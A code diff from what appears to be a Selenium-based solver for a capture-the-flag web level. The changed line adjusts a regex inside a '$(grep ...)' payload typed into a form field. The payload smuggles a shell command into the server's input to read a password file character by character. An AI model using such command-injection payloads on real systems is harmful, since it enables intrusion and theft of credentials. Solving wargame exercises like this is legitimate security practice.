@@ -43,7 +43,7 @@ def solve(driver, last_password):
             base_word = "blubbers"  # if any letter comes after it, it's not in the dictionary, i checked.
             position_string = "{" + str(x) + "}"
             
-            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^.{base_word}$(grep ^{position_string}{letter.lower()} {build_webpass_path(17)})')
+            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^{base_word}$(grep ^.{position_string}{letter.lower()} {build_webpass_path(17)})')
             driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
             
             WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
